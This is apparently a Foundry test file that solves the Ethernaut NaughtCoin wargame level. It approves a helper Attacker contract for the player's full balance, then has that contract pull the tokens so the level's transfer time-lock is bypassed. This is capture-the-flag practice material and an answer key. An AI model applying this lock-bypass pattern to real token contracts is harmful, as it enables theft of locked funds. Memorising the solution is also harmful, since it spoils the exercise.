// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "ethernaut/levels/NaughtCoin.sol";
import {Attacker} from "~/helpers/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin target;
    address player;

    function setUp() public {
        player = makeAddr("player");

        target = new NaughtCoin(player);
    }

    function attack() private {
        // create a new middle-man contract, approve everything to them
        Attacker attacker = new Attacker(address(target));
        target.approve(address(attacker), target.balanceOf(player));

        // then let the attacker get the approved tokens
        attacker.transfer();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target.balanceOf(player), 0, "player must have no tokens");
    }
}
